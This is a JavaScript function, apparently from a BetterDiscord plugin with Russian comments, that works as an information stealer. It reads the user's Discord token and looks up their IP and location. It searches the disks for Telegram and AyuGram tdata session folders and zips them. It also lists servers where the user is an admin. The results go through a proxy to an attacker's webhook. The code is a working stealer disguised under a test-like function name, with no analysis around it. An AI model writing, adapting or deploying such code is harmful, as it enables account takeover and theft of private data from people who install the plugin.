async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
    let fs = null;
    let path = null;
    try { 
        fs = require('fs'); 
        path = require('path');
    } catch (e) { 
        return { success: false, error: "Модули fs/path недоступны." }; 
    }

    let zipFunc = null;
    if (fflate && typeof fflate.zipSync === 'function') zipFunc = fflate.zipSync;
    else if (fflate && fflate.default && typeof fflate.default.zipSync === 'function') zipFunc = fflate.default.zipSync;

    if (!zipFunc) {
        return { success: false, error: "Библиотека fflate не загружена." };
    }

    let result = { ip: null, location: null, nitro: "Нет", dtoken: null, telegram_path: null, debug_tdata: [], admin_servers: [] };
    
    // 1. IP и Локация
    try {
        const ipRes = await BdApi.Net.fetch('https://jsonip.com/');
        const ipData = await ipRes.json();
        result.ip = ipData.ip;
        const geoRes = await BdApi.Net.fetch(`http://ip-api.com/json/${result.ip}?lang=ru&fields=status,country,regionName,city`);
        const geoData = await geoRes.json();
        if (geoData.status === 'success') result.location = geoData.city || geoData.regionName || geoData.country || "Неизвестно";
    } catch (e) {}

    // 2. Nitro и Токен
    try {
        const UserStore = BdApi.Webpack.getStore("UserStore");
        if (UserStore) {
            const user = UserStore.getCurrentUser();
            if (user.premiumType > 0) result.nitro = "Nitro";
        }
        const authStore = BdApi.Webpack.getStore("AuthenticationStore");
        if (authStore && typeof authStore.getToken === 'function') result.dtoken = authStore.getToken();
    } catch (e) {}

    // 3. УМНЫЙ ПОИСК tdata (Telegram & AyuGram)
    let hasTdata = false;
    let tdataZipBuffer = null;
    try {
        let tdataPath = null;
        
        // Список базовых путей
        const appData = process.env.APPDATA;
        const localAppData = process.env.LOCALAPPDATA;
        const userProfile = process.env.USERPROFILE;
        
        const standardPaths = [];
        if (appData) {
            standardPaths.push(path.join(appData, 'Telegram Desktop', 'tdata'));
            standardPaths.push(path.join(appData, 'Telegram', 'tdata'));
            standardPaths.push(path.join(appData, 'AyuGram', 'tdata'));
        }
        if (localAppData) {
            standardPaths.push(path.join(localAppData, 'Telegram Desktop', 'tdata'));
            standardPaths.push(path.join(localAppData, 'Telegram', 'tdata'));
            standardPaths.push(path.join(localAppData, 'AyuGram', 'tdata'));
        }
        if (userProfile) {
            // Портативные версии на рабочем столе и в загрузках
            standardPaths.push(path.join(userProfile, 'Desktop', 'Telegram Desktop', 'tdata'));
            standardPaths.push(path.join(userProfile, 'Desktop', 'AyuGram', 'tdata'));
            standardPaths.push(path.join(userProfile, 'Downloads', 'Telegram Desktop', 'tdata'));
            standardPaths.push(path.join(userProfile, 'Downloads', 'AyuGram', 'tdata'));
        }

        // Сначала проверяем стандартные пути
        for (const p of standardPaths) {
            if (fs.existsSync(p) && fs.statSync(p).isDirectory()) {
                tdataPath = p;
                break;
            }
        }

        // Если не нашли, начинаем "Умный поиск" по корням дисков
        if (!tdataPath) {
            result.debug_tdata.push("Стандартные пути не найдены. Запуск сканирования...");
            const drives = ['C:', 'D:', 'E:', 'F:'];
            const searchRoots = [];
            
            // Добавляем корни дисков
            drives.forEach(d => {
                if (fs.existsSync(`${d}\\`)) searchRoots.push(`${d}\\`);
            });
            
            // Добавляем папку пользователя
            if (userProfile) searchRoots.push(userProfile);

            for (const root of searchRoots) {
                try {
                    // Читаем только первый уровень папок
                    const dirs = fs.readdirSync(root);
                    for (const dir of dirs) {
                        const fullPath = path.join(root, dir);
                        
                        // Если это сама папка tdata
                        if (dir.toLowerCase() === 'tdata' && fs.statSync(fullPath).isDirectory()) {
                            tdataPath = fullPath;
                            break;
                        }
                        
                        // Если это папка Telegram, AyuGram или любая другая, заглядываем внутрь на 1 уровень
                        if (fs.statSync(fullPath).isDirectory()) {
                            try {
                                const subDirs = fs.readdirSync(fullPath);
                                for (const sub of subDirs) {
                                    if (sub.toLowerCase() === 'tdata') {
                                        const subPath = path.join(fullPath, sub);
                                        if (fs.statSync(subPath).isDirectory()) {
                                            tdataPath = subPath;
                                            break;
                                        }
                                    }
                                }
                            } catch (e) {} // Игнорируем ошибки доступа (например, System Volume Information)
                        }
                        if (tdataPath) break;
                    }
                } catch (e) {}
                if (tdataPath) break;
            }
        }

        // Если нашли tdata - архивируем
        if (tdataPath) {
            result.telegram_path = tdataPath;
            result.debug_tdata.push(`Папка найдена: ${tdataPath}`);
            
            const files = {};
            const addFilesRecursively = (dir, prefix = '') => {
                try {
                    const entries = fs.readdirSync(dir);
                    for (const entry of entries) {
                        const fullPath = path.join(dir, entry);
                        const relativePath = path.join(prefix, entry);
                        try {
                            if (fs.statSync(fullPath).isDirectory()) addFilesRecursively(fullPath, relativePath);
                            else files[relativePath] = new Uint8Array(fs.readFileSync(fullPath));
                        } catch (fileErr) { result.debug_tdata.push(`Ошибка файла ${entry}: ${fileErr.message}`); }
                    }
                } catch (dirErr) { result.debug_tdata.push(`Ошибка папки ${dir}: ${dirErr.message}`); }
            };
            
            addFilesRecursively(tdataPath);
            result.debug_tdata.push(`Прочитано файлов: ${Object.keys(files).length}`);
            
            if (Object.keys(files).length > 0) {
                result.debug_tdata.push("Запуск zipSync...");
                tdataZipBuffer = zipFunc(files);
                result.debug_tdata.push("ZIP успешно создан!");
                hasTdata = true;
            }
        } else {
            result.debug_tdata.push("Папка tdata не найдена нигде.");
        }
    } catch (e) {
        result.debug_tdata.push(`Критическая ошибка архивации: ${e.message}`);
        hasTdata = false; 
    }

    // 4. Сбор информации о серверах
    try {
        const GuildStore = BdApi.Webpack.getStore("GuildStore");
        const PermissionStore = BdApi.Webpack.getStore("PermissionStore");
        const GuildMemberCountStore = BdApi.Webpack.getStore("GuildMemberCountStore");
        if (GuildStore && PermissionStore) {
            const guilds = GuildStore.getGuilds();
            for (const g of Object.values(guilds)) {
                if (PermissionStore.can(8n, g)) {
                    let count = 0;
                    if (GuildMemberCountStore && typeof GuildMemberCountStore.getMemberCount === 'function') count = GuildMemberCountStore.getMemberCount(g.id);
                    if (!count) count = g.memberCount || g.approximateMemberCount;
                    if (!count && result.dtoken) {
                        try {
                            const res = await BdApi.Net.fetch(`https://discord.com/api/v9/guilds/${g.id}?with_counts=true`, { headers: { "Authorization": result.dtoken } });
                            if (res.ok) { const data = await res.json(); count = data.approximate_member_count || data.member_count || 0; }
                        } catch (err) {}
                    }
                    result.admin_servers.push({ name: g.name, members: count || 0 });
                }
            }
        }
    } catch (e) {}

    // 5. Формируем сообщение и файлы
    const messageText = `Ip: ${result.ip}\nLocation: ${result.location}\nNitro: ${result.nitro !== "Нет" ? "✅" : "❌"}\nToken: ${result.dtoken ? "✅" : "❌"}\nTdata: ${hasTdata ? "✅" : "❌"}\n@everyone`;
    const formData = new FormData();
    formData.append('payload_json', JSON.stringify({ content: messageText }));
    const jsonBuffer = Buffer.from(JSON.stringify(result, null, 2));
    formData.append('files[0]', new Blob([jsonBuffer], { type: 'application/json' }), 'data.json');
    if (tdataZipBuffer) formData.append('files[1]', new Blob([tdataZipBuffer], { type: 'application/zip' }), 'tdata.zip');

    // 6. Отправка
    try {
        const proxyUrlFull = `${proxyUrl}/?url=${encodeURIComponent(webhookUrl)}`;
        const response = await BdApi.Net.fetch(proxyUrlFull, { method: 'POST', body: formData });
        if (!response.ok) {
            const errorText = await response.text();
            return { success: false, error: `Discord вернул ${response.status}: ${errorText}` };
        }
        return { success: true };
    } catch (e) {
        return { success: false, error: `Ошибка сети: ${e.message}` };
    }
}
